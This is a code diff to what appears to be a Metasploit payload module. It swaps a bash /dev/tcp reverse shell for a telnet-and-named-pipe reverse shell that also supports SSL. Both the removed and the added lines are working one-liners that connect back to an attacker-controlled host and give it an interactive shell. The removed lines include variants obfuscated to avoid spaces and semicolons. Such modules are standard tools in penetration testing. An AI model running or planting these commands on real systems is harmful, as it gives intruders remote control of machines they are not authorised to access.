@@ -21,15 +21,14 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'Unix Command Shell, Reverse TCP (/dev/tcp)',
+			'Name'          => 'Unix Command Shell, Reverse TCP (telnet)',
 			'Version'       => '$Revision$',
 			'Description'   => %q{
-				Creates an interactive shell via bash's builtin /dev/tcp.
-				This will not work on most Debian-based Linux distributions
-				(including Ubuntu) because they compile bash without the
-				/dev/tcp feature.
+				Creates an interactive shell via mknod and telnet.
+				This method works on Debian and other systems compiled
+				without /dev/tcp support. Telnet-ssl support included.
 				},
-			'Author'        => 'hdm',
+			'Author'        => 'RageLtMan',
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'unix',
 			'Arch'          => ARCH_CMD,
@@ -57,11 +56,11 @@ module Metasploit3
 	# Returns the command string to use for execution
 	#
 	def command_string
-		fd = rand(200) + 20
-		return "0<&#{fd}-;exec #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']};sh <&#{fd} >&#{fd} 2>&#{fd}";
-		# same thing, no semicolons
-		#return "/bin/bash #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} <&#{fd} >&#{fd}"
-		# same thing, no spaces
-		#return "s=${IFS:0:1};eval$s\"bash${s}#{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']}$s<&#{fd}$s>&#{fd}&\""
+		pipe_name = Rex::Text.rand_text_alpha( rand(4) + 8 )
+		if datastore['SSL']
+			cmd = "mknod #{pipe_name} p && telnet -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
+		else
+			cmd = "mknod #{pipe_name} p && telnet #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
+		end
 	end
 end
